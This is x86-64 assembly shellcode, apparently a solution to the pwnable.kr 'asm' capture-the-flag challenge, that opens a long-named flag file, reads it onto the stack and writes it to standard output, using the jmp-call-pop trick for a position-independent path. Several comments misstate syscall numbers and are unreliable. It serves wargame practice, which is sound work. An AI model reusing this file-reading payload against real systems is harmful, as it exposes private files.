BITS 64

%define FLAG_BUFFER_SIZE 0xff

section .text     ; section declaration

global _start     ; Default entry point for ELF linking

_start:


; ------ open syscall ------
 mov rax, 2       ; put 2 into eax, since open is syscall #4
;  Get path address 
 jmp short path_buffer_offset
back_to_code_0:
 pop rdi          
 xor rsi, rsi     ; put 0 into rsi, since 0 is the value of READ_ONLY FLAG.
 xor rdx, rdx
 syscall
 cmp rax, 0 ; Check if open syscall failed.
 jl end
; ---- end open syscall  ----


; ----------- read syscall -----------
 mov rdi, rax     ; puts file descriptor in rdi.
 xor rax, rax     ; put 0 into eax, since read is syscall #4
 sub rsp, FLAG_BUFFER_SIZE
 mov rsi, rsp ; move rsi buffer address
 mov rdx, FLAG_BUFFER_SIZE
 syscall
 cmp rax, -1 ; Check if read syscall failed
 je end
; ----------- end read syscall -------


; ---------- write syscall ----------
mov eax, 1
mov rdi, 1
syscall
; ---------- end write syscall -------

end:
; ---------- exit syscall -------
 mov edi, eax
 mov eax, 60      ; put 1 into eax, since exit is syscall #1
 syscall
; ---------- end exit syscall -------
path_buffer_offset:
 call back_to_code_0
; path db "./jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj"

path     db   "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
db 0x00
